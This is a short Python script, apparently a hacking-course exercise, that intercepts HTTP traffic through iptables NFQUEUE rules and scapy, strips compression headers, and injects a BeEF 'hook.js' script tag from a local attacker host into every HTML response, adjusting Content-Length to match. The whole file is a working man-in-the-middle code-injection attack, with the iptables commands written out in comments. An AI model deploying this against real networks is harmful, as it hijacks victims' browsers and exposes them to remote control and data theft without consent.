#!/usr/bin/env python
import scapy.all as scapy
import netfilterqueue
import re

# python
# to get the ip of the website run the python file and than form iptables and then ping the website

# remote machine
# create quesue where the packets comimg from the host computer get stored --in terminal
# iptables -I FORWARD -j NFQUEUE --queue-num [queuenumber in which wanna store]----nothing to do with python but terminal

# local machine
# iptables -I OUTPUT -j NFQUEUE --queue-num [queuenumber in which wanna store]----nothing to do with python but terminal
# iptables -I INPUT -j NFQUEUE --queue-num [queuenumber in which wanna store]----nothing to do with python but terminal

def set_load(pkt,load):
    pkt[scapy.Raw].load=(load).encode()
    del pkt[scapy.IP].len
    del pkt[scapy.IP].chksum
    del pkt[scapy.TCP].chksum
    return pkt

def process_packet(packet):
    # to convert to scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # http port is 80 by default
        try:
            load = (scapy_packet[scapy.Raw].load).decode()
            if scapy_packet[scapy.TCP].dport == 80 or scapy_packet[scapy.TCP].dport == 10000:
                print("[+] Request")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                load = load.replace("HTTP/1.1", "HTTP/1.0")
            # for beef add --> < script  src = "http://192.168.1.8:3000/hook.js" > < / script >
            elif scapy_packet[scapy.TCP].sport == 80 or scapy_packet[scapy.TCP].sport == 10000:
                print("[+] Response")
                # the js modification wanted
                injection_code = '<script src = "http://192.168.1.8:3000/hook.js"> </script>'
                load = load.replace("</body>", injection_code + "</body>")
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeError:
            pass

        # sport http-- response in http
        # dport http-- request in http

    # #to let the packet pass
    packet.accept()
    # # to drop the packet no internet
    # packet.drop()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    print("[~] Keyboarc Interrupt")

# flush packet queue after executionnetcut
#iptables --flush